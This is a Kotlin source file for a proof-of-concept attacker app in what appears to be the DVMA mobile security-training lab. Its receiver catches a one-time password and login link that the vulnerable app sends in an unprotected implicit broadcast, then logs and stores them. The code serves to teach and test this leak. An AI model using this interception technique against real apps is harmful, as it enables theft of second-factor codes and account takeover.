package com.dvma.attacker

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Harvests the OTP that a vulnerable DVMA broadcasts UNPROTECTED.
 *
 * FOR AUTHORIZED SECURITY-TRAINING USE ONLY.
 *
 * DVMA's `cross_app_otp_credential_leak` module fires an implicit broadcast
 * (`com.dvma.action.OTP_ISSUED`) with no receiver permission, so
 * this unprivileged, separately-signed app - a real second app on the device -
 * receives the second factor it should never see. The capture is logged under
 * [TAG] so the harness / `adb logcat` observes the cross-process leak.
 *
 * When DVMA instead uses the permission-scoped delivery path, this receiver
 * gets nothing (it does not hold DVMA's signature-level permission).
 */
class OtpLeakReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != ACTION_OTP) return
        // Ensure the pullable capture file works regardless of which component
        // (activity/service/manifest) brought the process up.
        if (AttackerCapture.externalDir == null) {
            AttackerCapture.externalDir = context.applicationContext.getExternalFilesDir(null)
        }
        val otp = intent.getStringExtra("otp")
        val link = intent.getStringExtra("link")
        val captured = "HARVESTED cross-app OTP: otp=$otp link=$link"
        Log.w(TAG, captured)
        AttackerCapture.record(captured)
    }

    companion object {
        const val TAG = "DVMA-ATTACKER"
        const val ACTION_OTP = Dvma.ACTION_OTP_ISSUED
    }
}
